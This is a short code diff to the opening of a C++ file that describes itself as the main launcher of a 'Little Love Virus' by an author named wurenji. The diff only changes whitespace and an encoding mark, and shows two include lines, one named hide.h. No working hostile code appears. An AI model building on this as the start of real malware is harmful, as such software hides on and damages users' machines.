@@ -1,10 +1,11 @@
-/*
+﻿/*
 Little Love Virus
 Yellow Eel special version
 By wurenji,2022
 launcher:main.cpp
 The main() of the virus launcher.
 */
+
 
 #include"std.h"
 #include"hide.h"
